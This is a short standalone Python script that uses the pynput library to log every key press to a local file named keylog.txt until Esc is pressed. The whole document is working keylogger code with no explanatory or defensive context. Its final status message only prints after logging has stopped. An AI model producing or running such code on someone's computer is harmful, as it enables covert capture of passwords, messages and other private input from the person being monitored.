from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    """Records key presses into a log file."""
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")  # Logs character keys
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" {key} ")  # Logs special keys

def on_release(key):
    """Stops logging when 'Esc' is pressed."""
    if key == keyboard.Key.esc:
        return False  # Stop listener

# Set up the key listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print(f"Keystrokes are being recorded in '{log_file}'")